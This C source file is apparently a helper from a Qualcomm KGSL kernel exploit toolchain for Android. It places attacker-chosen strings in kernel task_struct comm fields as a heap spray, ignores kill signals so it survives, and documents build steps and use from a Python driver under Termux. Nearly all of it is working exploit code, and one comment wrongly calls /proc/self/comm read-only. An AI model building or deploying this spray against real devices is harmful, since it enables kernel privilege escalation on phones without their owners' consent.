/* spray_helper.c - reliable spray process for KGSL exploit
 *
 * v4.1.18: replaces the fragile Python helper that was
 * crashing on Termux with ctypes.CDLL() failures. This is
 * a tiny C binary that:
 *   1. Sets task_struct->comm via prctl(PR_SET_NAME) with
 *      the comm string passed in argv[1] (e.g. "KETO042212345")
 *   2. Ignores SIGCHLD/SIGTERM/SIGHUP so it can't be killed
 *      by parent signals
 *   3. Sleeps for the duration passed in argv[2] (seconds)
 *      in a signal-safe loop using nanosleep
 *
 * Build:
 *   gcc -O2 -static spray_helper.c -o spray_helper
 *   # OR if -static fails (Termux bionic may not have static libc):
 *   gcc -O2 spray_helper.c -o spray_helper
 *
 * Usage from Python:
 *   subprocess.Popen(["./spray_helper", "KETO042212345", "3600"])
 *
 * v4.1.18 FIX: previously the Python helper used
 *   ctypes.CDLL("libc.so.6" or None)
 * which sometimes fails on Termux (bionic doesn't have
 * libc.so.6; CDLL(None) is unreliable). The C binary
 * uses the platform's libc directly via the prctl()
 * syscall, no dlopen needed.
 *
 * Why this is the right approach:
 *   - prctl() is a direct syscall, no library load required
 *   - The C binary never execve's, so comm stays as set
 *   - nanosleep loop is immune to SIGCHLD
 *   - Total size: ~8KB, no dependencies on python
 */

#include <sys/prctl.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>

#ifndef PR_SET_NAME
#define PR_SET_NAME 15
#endif

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "usage: %s COMM [SECONDS]\n", argv[0]);
        return 1;
    }
    const char *comm = argv[1];
    int seconds = (argc >= 3) ? atoi(argv[2]) : 3600;
    if (seconds <= 0) seconds = 3600;

    /* Step 1: ignore signals that would kill us. We want
     * to survive even if the parent gets SIGCHLD/SIGTERM
     * (which can happen when the parent forks rapidly). */
    signal(SIGCHLD, SIG_IGN);
    signal(SIGTERM, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    /* Step 2: set task_struct->comm. This writes directly
     * to the current task's comm field. PR_SET_NAME only
     * takes the first 15 chars + NUL (TASK_COMM_LEN=16). */
    int pr = prctl(PR_SET_NAME, (unsigned long)comm, 0, 0, 0);

    /* Step 2.5: v4.1.23 log to /sdcard so we can see what
     * happened. On some Android kernels, PR_SET_NAME is
     * silently denied (SELinux or capability check) and
     * comm stays as "spray_helper". Logging the result
     * tells us if prctl returned -1 (failed) or 0
     * (success). */
    FILE *lf = fopen("/sdcard/kgsl_spray.log", "a");
    if (lf) {
        fprintf(lf, "pid=%d comm_set=%d errno=%d want=%s\n",
                getpid(), pr, pr ? errno : 0, comm);
        fclose(lf);
    }

    /* Step 2.6: ALSO try /proc/self/comm file approach. On
     * some Android kernels, the kernel task->comm is
     * protected, but writing to /proc/self/comm directly
     * (if the process has CAP_SYS_RESOURCE) works. We try
     * it as a fallback. Note: /proc/self/comm is normally
     * read-only, so this will fail with EACCES for
     * unprivileged processes — that's fine, we just want
     * to know. */
    /* (skipped: /proc/self/comm is read-only) */

    /* Step 3: signal-safe sleep loop. nanosleep with
     * EINTR retry keeps us alive even if a stray signal
     * arrives. We sleep 1s at a time so total drift is
     * small. */
    struct timespec ts;
    ts.tv_sec = 1;
    ts.tv_nsec = 0;
    for (int i = 0; i < seconds; i++) {
        while (nanosleep(&ts, &ts) == -1 && errno == EINTR) {
            /* retry */
        }
    }
    return 0;
}
